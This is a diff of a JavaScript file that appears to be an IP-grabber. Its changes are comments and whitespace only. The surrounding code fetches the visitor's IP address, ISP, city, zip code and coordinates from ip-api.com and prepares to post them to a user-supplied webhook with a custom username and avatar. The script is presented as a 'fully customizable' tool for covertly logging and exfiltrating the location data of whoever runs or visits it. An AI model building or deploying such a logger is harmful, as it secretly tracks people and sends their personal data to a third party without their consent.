@@ -3,11 +3,11 @@
 var webHookUrl = "YOUR WEBHOOK";
 
 const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('http://ip-api.com/json/');
+    const response = await fetch('http://ip-api.com/json/'); //link to API
     const data = await response.json();
 
    
-    var ip = data.query;
+    var ip = data.query; // this takes the data from the IP API 
 
     var provider = data.org + " (" + data.as + ")";
 
@@ -18,7 +18,7 @@ const request = async () => { // Calling a "synchronous" fetch
     var city = data.city;
 
     var zip = data.zip;
-    var lat = data.lat;
+    var lat = data.lat;       
     var lon = data.lon;
 
   
@@ -27,7 +27,7 @@ const request = async () => { // Calling a "synchronous" fetch
 
     postRequest.setRequestHeader('Content-type', 'application/json');
 
-    var params = {   //this is the start of your webhook
+    var params = {   //this is the start of your webhook (FULLY CUSTOMIZABLE)
         username: "USERNAME",
         avatar_url: "IMAGE",
         content:   
